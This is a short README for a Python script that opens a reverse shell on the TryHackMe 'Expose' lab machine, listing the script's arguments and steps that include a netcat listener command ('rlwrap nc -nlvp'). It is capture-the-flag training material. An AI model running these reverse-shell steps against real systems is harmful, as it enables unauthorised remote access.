## Expose-Tryhackme
Python script to get direct reverse shell of expose machine on tryhackme

- -u = website's IP
- -p = port on which website is running like 1337
- -a = attacker's IP , Your tun0 IP
- -nc = Netcat port , ex : 9001

#### Steps : 
1. run : rlwrap nc -nlvp {port
2. python3 shell.py -u {value} -p {value} -a {value} -nc {value}
3. Enjoy you shell

##### THANKYOU!
